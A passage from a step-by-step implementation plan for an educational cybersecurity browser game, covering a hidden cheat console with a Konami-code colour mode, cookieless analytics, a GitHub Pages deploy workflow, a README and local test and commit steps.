- Consumes: `runCommand`, `isCheat`, `konamiMatcher`, `App` (`act`, `dispatch`, `run`, `root`, `refresh`), `View`, `FieldScene`, `FireWallView`, `lang`, `t`, `el`.
- Produces: `ConsoleView(ui, app)`; `RootModeView(scene, ui, fire: FireWallView)` (applies or removes the amber palette whenever `refresh` runs); `App.onRoot: ((on: boolean) => void) | null`.

- [ ] **Step 1: Konami in the App**

In `src/app.ts`, import `konamiMatcher` from `./core/keys`, add the field `private readonly konami = konamiMatcher();`, and at the top of `key(e)` insert:
```ts
    if (this.screen === 'title' && this.konami(e.key)) {
      this.root = !this.root;
      this.refresh();
      this.onScreen?.('title');
      return;
    }
```
(`onScreen('title')` re-renders the title so the ROOT badge appears; the `refresh()` lets `RootModeView` repaint.)

- [ ] **Step 2: Root mode view**

Append to `src/game/views/fireWall.ts`:
```ts
export const FIRE_AMBER: FirePalette = [[120, 60, 0, 190], [255, 150, 0, 230], [255, 200, 80, 245], [255, 240, 200, 255]];
```

`src/game/views/rootMode.ts`:
```ts
// packages
import Phaser from 'phaser';

// core
import type { Run } from '../../core/run';

// local
import type { App } from '../../app';
import type { FieldScene } from '../FieldScene';
import type { View } from '../view';
import { FIRE_AMBER, FIRE_BLUE, type FireWallView } from './fireWall';

// Root mode: an amber-phosphor terminal. The DOM swaps its CSS variables; the canvas gets a sepia matrix.
export class RootModeView implements View {
  private filter: Phaser.Filters.ColorMatrix | null = null;

  constructor(private readonly scene: FieldScene, private readonly ui: HTMLElement, private readonly fire: FireWallView, private readonly app: App) {}

  refresh(_run: Run | null): void {
    const on = this.app.root;
    this.ui.classList.toggle('root', on);
    document.body.classList.toggle('root', on);
    this.fire.palette = on ? FIRE_AMBER : FIRE_BLUE;
    const cam = this.scene.cameras.main;
    if (on && !this.filter) {
      this.filter = cam.filters.internal.addColorMatrix();
      this.filter.colorMatrix.sepia();
      cam.setBackgroundColor('#1a1408');
    } else if (!on && this.filter) {
      cam.filters.internal.remove(this.filter);
      this.filter = null;
      cam.setBackgroundColor('#292929');
    }
  }
}
```

Append the amber palette to `src/styles.css`:
```css
/* ---------- root mode: amber phosphor ---------- */
body.root, #ui.root {
  --paper: #1a1408; --sub: #241b0a; --soft: #120d05; --mute: #3a2c10; --rule: #ffb000;
  --ink: #ffb000; --dim: #b07a00; --r: #ff5a1f; --b: #ffcc4d; --gold: #ffd27a;
}
#ui.root .scanlines { background: repeating-linear-gradient(to bottom, transparent 0 2px, rgba(30,15,0,.28) 2px 3px); }
```

- [ ] **Step 3: Console view**

Append to `src/styles.css`:
```css
/* ---------- hidden console ---------- */
.term { position: absolute; left: 130px; top: 76px; width: 760px; height: 400px; z-index: 45; background: rgba(10,10,10,.96); border: 1px solid var(--b); display: none; flex-direction: column; pointer-events: auto; box-shadow: -3px 0 0 var(--r), 3px 0 0 var(--b); }
.term.show { display: flex; }
.term .bar { font-size: 13px; color: var(--paper); background: var(--b); padding: 2px 10px; }
.term pre { flex: 1; margin: 0; padding: 10px 12px; overflow-y: auto; font-family: var(--code); font-size: 14px; line-height: 1.45; color: var(--ink); white-space: pre-wrap; }
.term .in { display: flex; gap: 8px; padding: 8px 12px; border-top: 1px solid var(--mute); font-family: var(--code); font-size: 14px; }
.term .in span { color: var(--b); }
.term input { flex: 1; background: transparent; border: 0; outline: 0; color: var(--ink); font-family: var(--code); font-size: 14px; caret-color: var(--b); }
#ui.glitch-hard { animation: hardglitch .9s steps(1); }
@keyframes hardglitch { 0% { transform-origin: 0 0; filter: hue-rotate(90deg) saturate(3); } 20% { clip-path: inset(10% 0 40% 0); } 40% { clip-path: inset(50% 0 5% 0); filter: invert(1); } 60% { clip-path: none; filter: hue-rotate(200deg); } 80% { filter: contrast(3); } 100% { filter: none; clip-path: none; } }
```

`src/ui/consoleView.ts`:
```ts
// core
import { isCheat, runCommand } from '../core/console';
import type { Screen } from '../core/keys';

// game
import type { View } from '../game/view';

// i18n
import { lang, t } from '../i18n';

// local
import type { App } from '../app';
import { el } from './dom';

export class ConsoleView implements View {
  private readonly box: HTMLElement;
  private readonly bar: HTMLElement;
  private readonly out: HTMLElement;
  private readonly input: HTMLInputElement;
  private greeted = false;

  constructor(private readonly ui: HTMLElement, private readonly app: App) {
    this.box = el('div', 'term', ui);
    this.bar = el('div', 'bar', this.box, t('console.title'));
    this.out = el('pre', '', this.box);
    const row = el('div', 'in', this.box);
    el('span', '', row, '$');
    this.input = el('input', '', row);
    this.input.spellcheck = false;
    this.input.autocomplete = 'off';
    this.input.addEventListener('keydown', (e) => {
      if (e.key !== 'Enter') return;
      e.preventDefault();
      this.run(this.input.value);
      this.input.value = '';
    });
  }

  private print(lines: string[]): void {
    this.out.textContent += `${lines.join('\n')}\n`;
    this.out.scrollTop = this.out.scrollHeight;
  }

  private run(cmd: string): void {
    this.print([`$ ${cmd}`]);
    const reply = runCommand(cmd, { lang: lang(), owned: this.app.run?.state.owned ?? [] });
    if (reply.lines.length) this.print(reply.lines);
    const e = reply.effect;
    if (!e) return;
    if (e.kind === 'clear') this.out.textContent = '';
    if (e.kind === 'exit') this.app.act('closeConsole');
    if (e.kind === 'glitch') {
      this.ui.classList.remove('glitch-hard');
      void this.ui.offsetWidth;
      this.ui.classList.add('glitch-hard');
      setTimeout(() => this.ui.classList.remove('glitch-hard'), 900);
    }
    if (isCheat(e) && this.app.run) {
      const evs = e.kind === 'credits' ? this.app.run.cheat('credits', e.amount) : this.app.run.cheat(e.kind === 'god' ? 'god' : 'skip');
      this.app.act('closeConsole');
      this.app.dispatch(evs);
    }
  }

  refresh(): void {
    this.bar.textContent = t('console.title');
  }

  screen(s: Screen): void {
    const open = s === 'console';
    this.box.classList.toggle('show', open);
    if (!open) return;
    if (!this.greeted) { this.print([t('console.greeting')]); this.greeted = true; }
    setTimeout(() => this.input.focus(), 0);
  }
}
```

(The App's `act('closeConsole')` restores the previous screen; the `skip` cheat then moves the run to its draft through `dispatch`.)

- [ ] **Step 4: Register in `src/main.ts`**

After the overlays are added:
```ts
  app.add(new ConsoleView(ui, app), new RootModeView(scene, ui, fireWall, app));
```
To have `fireWall` in scope, change the first `app.add(...)` call to create it first: `const fireWall = new FireWallView(scene);` and pass `fireWall` instead of `new FireWallView(scene)`. Imports: `ConsoleView` (`./ui/consoleView`), `RootModeView` (`./game/views/rootMode`).

- [ ] **Step 5: Smoke checks `console` and `konami`**

```js
  async console(page) {
    await play(page);
    await page.keyboard.press('`');
    await page.waitForSelector('#ui .term.show input');
    await page.waitForFunction(() => document.activeElement?.tagName === 'INPUT');
    await page.keyboard.type('help');
    await page.keyboard.press('Enter');
    await page.keyboard.type('h p');
    const hints = await page.evaluate(() => window.__nsp.app.run.state.hints);
    if (hints) throw new Error('typing h in the console toggled hints');
    await page.keyboard.press('Control+A');
    await page.keyboard.press('Backspace');
    await page.keyboard.type('nmap shop.example');
    await page.keyboard.press('Enter');
    const out = await page.textContent('#ui .term pre');
    if (!/filtered/.test(out) || !/man <attack>|man <ataque>/.test(out)) throw new Error(out);
    await page.screenshot({ path: `${OUT}/console.png` });
    await page.keyboard.press('Escape');
    if (await page.evaluate(() => window.__nsp.app.screen) !== 'playing') throw new Error('console did not close');
    await page.keyboard.press('`');
    await page.waitForSelector('#ui .term.show input');
    await page.waitForFunction(() => document.activeElement?.tagName === 'INPUT');
    await page.keyboard.type('skip');
    await page.keyboard.press('Enter');
    await page.waitForFunction(() => window.__nsp.app.screen === 'draft' && window.__nsp.app.run.state.tampered);
  },
  async konami(page) {
    await page.waitForSelector('#ui .ov-title .btn');
    for (const k of ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a']) await page.keyboard.press(k);
    await page.waitForSelector('#ui .ov-title .badge-root');
    if (!(await page.evaluate(() => document.body.classList.contains('root')))) throw new Error('root palette not applied');
    await play(page);
    await page.waitForTimeout(1500);
    await page.screenshot({ path: `${OUT}/root.png` });
    if (!(await page.evaluate(() => window.__nsp.app.run.state.cfg.root))) throw new Error('run not in root mode');
  },
```

Run: `npm run lint && npm test && node scripts/smoke.mjs`
Expected: all PASS. `console.png` shows the terminal over the lanes with `help` and the nmap table; `root.png` shows the whole game in amber, hints button hidden, ROOT badge in the HUD.

- [ ] **Step 6: Commit**

```bash
git add -A
git commit -m "Add the hidden console and the Konami root mode" -m "The backtick opens a terminal with man pages, nmap and jokes whose cheats mark the run as tampered; the Konami code on the title switches to an amber, faster, hint-free root mode with its own bests." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 20: Analytics, README, deploy workflow and the local release check

**Files:**
- Create: `src/analytics.ts`, `src/ui/analyticsView.ts`, `.github/workflows/deploy.yml`, `README.md`
- Modify: `index.html` (Umami tag), `src/ui/debrief.ts` (track share), `src/main.ts` (register), `scripts/smoke.mjs` (add `analytics` check)
- Test: `src/analytics.test.ts`

**Interfaces:**
- Consumes: `App`, `View`, `RunEvent`, `resultOf`, `grade`.
- Produces: `track(name: string, data?: Record<string, string | number | boolean>): void` (no-op when the tracker is blocked or absent); `scoreBucket(score: number): string`; `AnalyticsView(app)`.

- [ ] **Step 1: Write the failing test**

`src/analytics.test.ts`:
```ts
// packages
import { afterEach, describe, expect, it, vi } from 'vitest';

// local
import { scoreBucket, track } from './analytics';

afterEach(() => { vi.unstubAllGlobals(); });

describe('analytics', () => {
  it('forwards events to umami when present and stays silent otherwise', () => {
    const calls: unknown[] = [];
    vi.stubGlobal('window', { umami: { track: (n: string, d: unknown) => calls.push([n, d]) } });
    track('game-start', { mode: 'campaign' });
    expect(calls).toEqual([['game-start', { mode: 'campaign' }]]);
    vi.stubGlobal('window', {});
    expect(() => track('x')).not.toThrow();
    vi.stubGlobal('window', { umami: { track: () => { throw new Error('blocked'); } } });
    expect(() => track('x')).not.toThrow();
  });

  it('buckets scores coarsely', () => {
    expect(scoreBucket(0)).toBe('0-999');
    expect(scoreBucket(4210)).toBe('1k-4.9k');
    expect(scoreBucket(18420)).toBe('10k-24.9k');
    expect(scoreBucket(90000)).toBe('50k+');
  });
});
```

Run: `npx vitest run src/analytics.test.ts` → FAIL.

- [ ] **Step 2: Implement `src/analytics.ts` and `src/ui/analyticsView.ts`**

`src/analytics.ts`:
```ts
type Umami = { track: (name: string, data?: Record<string, string | number | boolean>) => void };

// Umami Cloud, cookieless; a blocked or missing tracker must never break the game.
export const track = (name: string, data?: Record<string, string | number | boolean>): void => {
  try {
    (window as unknown as { umami?: Umami }).umami?.track(name, data);
  } catch {
    /* tracker blocked */
  }
};

export const scoreBucket = (score: number): string =>
  score < 1000 ? '0-999' : score < 5000 ? '1k-4.9k' : score < 10000 ? '5k-9.9k' : score < 25000 ? '10k-24.9k' : score < 50000 ? '25k-49.9k' : '50k+';
```

`src/ui/analyticsView.ts`:
```ts
// core
import type { RunEvent } from '../core/events';
import type { Screen } from '../core/keys';
import type { Run } from '../core/run';
import { grade, resultOf } from '../core/score';

// game
import type { View } from '../game/view';

// local
import { scoreBucket, track } from '../analytics';
import type { App } from '../app';

export class AnalyticsView implements View {
  private root = false;

  constructor(private readonly app: App) {}

  start(run: Run): void {
    track('game-start', { mode: run.state.cfg.mode, root: run.state.cfg.root });
  }

  event(ev: RunEvent, run: Run): void {
    if (ev.type === 'waveCleared') track('wave-cleared', { mode: run.state.cfg.mode, wave: ev.wave });
    if (ev.type === 'runEnded') {
      const r = resultOf(run.state);
      track('run-ended', { mode: r.mode, outcome: ev.reason, grade: grade(r) ?? `wave-${r.wave}`, score: scoreBucket(r.score), tampered: r.tampered });
    }
  }

  screen(s: Screen): void {
    if (s === 'console') track('console-opened');
  }

  refresh(): void {
    if (this.app.root !== this.root) { this.root = this.app.root; track('root-mode', { on: this.root }); }
  }
}
```

In `src/ui/debrief.ts`, import `track` from `../analytics` and call `track('share-copied', { mode: r.mode });` at the start of the copy button's `onclick`.

Register in `src/main.ts`: `app.add(new AnalyticsView(app));` (import from `./ui/analyticsView`).

- [ ] **Step 3: Umami tag in `index.html`**

After the module script, inside `<body>` (same tag as the site; project pages share the `jorius.github.io` domain, so the dev server and previews send nothing):
```html
    <!-- Umami analytics (cloud.umami.is, cookieless, no IP storage); same website as jorius.github.io. -->
    <script
      defer
      src="https://cloud.umami.is/script.js"
      data-website-id="f182739a-828d-4a63-81ab-07e8fd73945f"
      data-domains="jorius.github.io"
      data-exclude-search="true"
      data-exclude-hash="true"
      data-do-not-track="true"
    ></script>
```

Add a smoke check that the tag is present and the game still boots when the script is blocked:
```js
  async analytics(page) {
    await page.route('https://cloud.umami.is/**', (r) => r.abort());
    await page.reload({ waitUntil: 'networkidle' });
    await play(page);
    if (!(await page.$('script[src="https://cloud.umami.is/script.js"]'))) throw new Error('umami tag missing');
  },
```
Note: blocked requests log a console error (`net::ERR_FAILED`); filter that one in the harness's console listener: change it to `page.on('console', (m) => { if (m.type() === 'error' && !/umami|ERR_FAILED/.test(m.text())) errors.push(m.text()); });`.

- [ ] **Step 4: Deploy workflow**

`.github/workflows/deploy.yml`:
```yaml
name: Deploy to GitHub Pages

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read
  pages: write
  id-token: write

concurrency:
  group: pages
  cancel-in-progress: false

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Check out repository
        uses: actions/checkout@v4
      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version-file: .nvmrc
          cache: npm
      - name: Install dependencies
        run: npm ci
      - name: Lint
        run: npm run lint
      - name: Test with coverage gate
        run: npm run test:coverage
      - name: Build
        run: npm run build
      - name: Upload Pages artifact
        uses: actions/upload-pages-artifact@v3
        with:
          path: dist

  deploy:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - name: Deploy to GitHub Pages
        id: deployment
        uses: actions/deploy-pages@v4
```

- [ ] **Step 5: README**

`README.md`:
````markdown
# None Shall Pass

A cybersecurity mini-game. You are the Black Knight guarding a server: packets stream down five lanes toward a wall of fire, and you read them, spear the attacks and let the real users through. Between waves you draft upgrades that teach real defences.

**Play:** https://jorius.github.io/none-shall-pass/ (desktop, keyboard)

## Controls

| Key | Action |
|---|---|
| ↑ ↓ | move between lanes |
| Tab / Shift+Tab | next / previous packet in the lane |
| Space | throw a spear at the target |
| Esc | let the target go |
| click | target a packet |
| H | hints (underline the tells, score ×0.75) |
| P | pause |

Do nothing and a packet passes. There are a couple of secrets for the curious.

## What it teaches

Every packet carries a short explanation, and every upgrade states what it does, why it works in real life and its catch:

| Upgrade | Lesson |
|---|---|
| Port lockdown | default-deny: expose only what you run |
| Quote filter | naive WAF signatures misfire (O'Reilly) and miss encodings (`%27`) |
| fail2ban, Tarpit | rate limiting slows attackers; botnets rotate IPs |
| CDN + rate limit | in a flood, the volume is the attack |
| Prepared statements, sort-column allow-list | fix SQL injection at the root; ORDER BY needs an allow-list |
| MFA + SSH keys | stolen passwords stop being enough |
| Output encoding + CSP | XSS is fixed on output; CSP is the seatbelt |
| Observability I–III | logs, metrics and tracing reveal progressively subtler attacks |
| Squire | signature detection handles the obvious so people can hunt the subtle |

All IP addresses, networks and domains come from the documentation ranges (RFC 5737, RFC 5398, `.example`).

## Development

```bash
npm ci
npm run dev          # Vite dev server
npm test             # unit tests (vitest)
npm run test:coverage
npm run build
node scripts/smoke.mjs   # headless end-to-end checks (needs `npx playwright install chromium-headless-shell`)
```

Architecture: `src/core` is a deterministic, Phaser-free simulation (`Run.step` returns events); `src/game` is a single Phaser 4 scene that renders the field; `src/ui` is a DOM layer for every text-heavy surface. Design: `docs/superpowers/specs/2026-10-04-none-shall-pass-design.md`.

## Credits

- The name and the knight's lines quote Monty Python and the Holy Grail; no imagery from the film is used. All pixel art is original.
- Fonts: Space Mono, IBM Plex Mono and Atkinson Hyperlegible Next (SIL Open Font License), via Fontsource.
- Built with [Phaser](https://phaser.io).

## License

MIT © 2026 Jose Rios
````

- [ ] **Step 6: Full local verification**

Run, in order, and read each output:
```bash
npm run lint
npm run test:coverage
npm run build
node scripts/smoke.mjs
```
Expected: lint clean; all unit tests pass with `src/core` coverage ≥ 80% on every metric; build emits `dist/`; every smoke check prints PASS. Open each screenshot in `smoke-out/` and compare against the v4 mock (`docs/mocks/2026-10-04-core-loop-v4.html`): same layout, same palette, crisp text.

Then start the dev server for Jose (it keeps running; do not open a browser window yourself):
```bash
npm run dev -- --port 5190 --strictPort
```

- [ ] **Step 7: Commit**

```bash
git add -A
git commit -m "Add analytics, the Pages workflow and the README" -m "Umami events show how far people get without collecting anything personal; the workflow lints, tests and builds before every deploy; the README explains the controls and the lesson behind each upgrade." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

- [ ] **Step 8: Create the GitHub repo without pushing**

```bash
gh repo create jorius/none-shall-pass --public --description "A cybersecurity mini-game: guard the server, read the packets, let the real users through." --homepage "https://jorius.github.io/none-shall-pass/"
git remote add origin git@github-jorius:jorius/none-shall-pass.git
git remote -v
```
Expected: the empty repo exists on GitHub and `origin` points at it. **Do not push.** Enabling Pages (`gh api -X POST repos/jorius/none-shall-pass/pages -f build_type=workflow`) and the first push of `main` happen only after Jose has played the build and asked for it.

---
